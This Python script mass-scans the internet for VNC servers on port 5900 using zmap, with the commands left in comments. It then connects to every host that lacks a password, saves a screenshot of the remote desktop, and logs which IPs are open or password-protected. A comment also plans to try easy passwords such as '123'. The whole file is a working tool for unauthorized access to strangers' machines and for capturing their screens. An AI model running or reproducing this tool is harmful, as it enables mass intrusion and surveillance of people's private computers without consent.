import os
from multiprocessing import Process, Pool, Value, Lock	
from ctypes import c_int
import subprocess
from datetime import datetime
import time
from io import StringIO
from vncdotool import api

#install vncdotool and zmap

#sudo zmap -B 10M -p 5900 -n 500000 -o results.txt
#sudo zmap -B 10M -p 5900 -n 1000000000 -o results.txt    2.5 days/60 hours
#sudo zmap -B 10M -p 5900 -n 16666666 -o results.txt    1 hour


vncport = "5900"
#Timeout in seconds
connection_timeout = 10
#screenshots can take minutes..
screenshot_timeout = 180
process_amount = 50
#replaces the backslashes in os.getcwd with forward slashes.
screenshot_path = os.getcwd().replace('\\', '/') + "/results/screenshots/"

ipfile = "./results.txt"
valid_ipfile = "./results/" + time.strftime("%Y%m%d-%H%M%S") + "_validips.txt"
password_ipfile = "./results/" + time.strftime("%Y%m%d-%H%M%S") + "_passwordips.txt"

#If vnc has password, try easy pws like "123"

def screencapture(startendpts):
    #startendpts in format: [start:end] eg: [0,52] [53, 106]...
    start = startendpts[0]
    end = startendpts[1]
    passed_ips = []
    password_failed_ips = []    
    passed_amt = failed_amt = password_failed_amt = 0
    #Will NOT work in an IDLE with multiprocessing!
    for i in range(start, end):
        screenshot_starttime = datetime.now()
        vncserver = vncservers[i]
        timestr = time.strftime("%Y%m%d-%H%M%S")
        #screenshot_filename = timestr + ".png"
        screenshot_filename = str(i+1) + "_" + vncserver + "_" + timestr + ".png"
        try:
            #Test connection
            client = api.connect(vncserver, password=None)
            client.timeout = connection_timeout
            client.connectionMade()
            print("Connection has established successfully to IP " + str(i + 1) + "/" + str(end) + ": " + vncserver)
            
            #Now restart. This is required.
            client = api.connect(vncserver, password=None)
            client.timeout = screenshot_timeout
            client.captureScreen(screenshot_path + screenshot_filename)
            client.disconnect()
        except Exception as e:
            if "Timeout" in str(e):
                failed_amt += 1
                None
                #print("Connection to IP " + str(i) + "/" + str(end) + " has timed out.")
            elif "password" in str(e):
                print("IP " + str(i + 1) + "/" + str(end) + " (" + vncserver + ") has failed because it requires a password.")
                password_failed_amt += 1
                password_failed_ips.append(vncserver)
            else:
                None
                print("Screencapture for IP " + str(i) + "/" + str(end) + " has failed: " + str(e))
                failed_amt += 1
        else:
            screenshot_endtime = datetime.now()
            screenshot_duration = screenshot_endtime - screenshot_starttime
            print(screenshot_filename + " screenshot taken in " + str(screenshot_duration.total_seconds()) + " seconds.")    
            passed_amt += 1  
            passed_ips.append(vncserver) 
    
    resultsdict = {}
    resultsdict['passed_ips'] = passed_ips
    resultsdict['password_failed_ips'] = password_failed_ips
    resultsdict['password_failed_amt'] = password_failed_amt
    resultsdict['passed_amt'] = passed_amt
    resultsdict['failed_amt'] = failed_amt
    return resultsdict     
    
        
        
def readipfile():
    servers = []
    with open(ipfile) as fp:
        for line in fp:
            servers.append(line.strip())
    return servers

vncservers = readipfile()
if not os.path.exists(screenshot_path):
    os.makedirs(screenshot_path)   
serveramt = len(vncservers)
split_serveramt = int(serveramt / process_amount)

print("IPs to attempt to screen capture: " + str(serveramt) + ". There will be " + str(process_amount) + " processes handling " + str(split_serveramt) + " IPs each.")


if __name__ == '__main__':
    processlist = []
    xypairs = []
    for g in range(process_amount):
        x = split_serveramt * g
        y = split_serveramt * (g + 1)
        xypair = [x, y]
        xypairs.append(xypair)
    
    #print(xypairs)
    pool = Pool(processes=len(xypairs))
    result_list = pool.map(screencapture, xypairs)
    print("results: ")
    passed_amt = password_failed_amt = failed_amt = 0
    passed_ips = []
    password_failed_ips = []
    
    for result in result_list:
        passed_amt += result['passed_amt']
        password_failed_amt += result['password_failed_amt']
        failed_amt += result['failed_amt']
        for ip in result['password_failed_ips']:
            password_failed_ips.append(ip)
        for ip in result['passed_ips']:
            passed_ips.append(ip)
        
             
#Will not go further until all of the multiprocesses have finished.
print("Screencaptures have finished. Passed: " + str(passed_amt) + ". Password failed: " + str(password_failed_amt) + ". Failed: " + str(failed_amt) + ".")
print("Writing passed IPs to file.")
with open(valid_ipfile, "w") as myfile:
    for ip in passed_ips:
        myfile.write(ip + "\n")    
print("Passed IPs have been written to " + valid_ipfile)
print("Writing password-failed IPs to file.")
with open(password_ipfile, "w") as myfile:
    for ip in password_failed_ips:
        ip += "\n"
        myfile.write(ip)    
print("Password-failed IPs have been written to " + password_ipfile)
